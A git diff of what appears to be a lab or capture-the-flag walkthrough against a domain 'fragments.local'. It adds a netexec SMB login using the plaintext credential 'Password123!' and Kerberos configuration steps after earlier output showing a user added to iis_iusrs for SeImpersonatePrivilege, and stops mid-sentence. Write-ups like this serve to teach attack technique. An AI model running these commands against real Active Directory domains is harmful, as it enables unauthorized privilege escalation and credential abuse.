@@ -675,4 +675,18 @@ bloodyAD --host dc01.fragments.local -d fragments.local -k add groupMember 'iis_
 [+] sharedadmin added to iis_iusrs
 ```
 
-Now theyre also in the correct group to inherit SeImpersonate
+Now theyre also in the correct group to inherit SeImpersonatePrivilege
+
+```python
+sudo nxc smb dc01.fragments.local -u sharedadmin -p 'Password123!' -k --smb-timeout 5 --generate-krb5-file /etc/krb5.conf
+SMB         dc01.fragments.local 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.fragments.local 445    DC01             [+] krb5 conf saved to: /etc/krb5.conf
+SMB         dc01.fragments.local 445    DC01             [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
+SMB         dc01.fragments.local 445    DC01             [+] fragments.local\sharedadmin:Password123!
+```
+
+```python
+export KRB5_CONFIG=/etc/krb5.conf
+```
+
+Then ill generate a realm and export it to so i can 
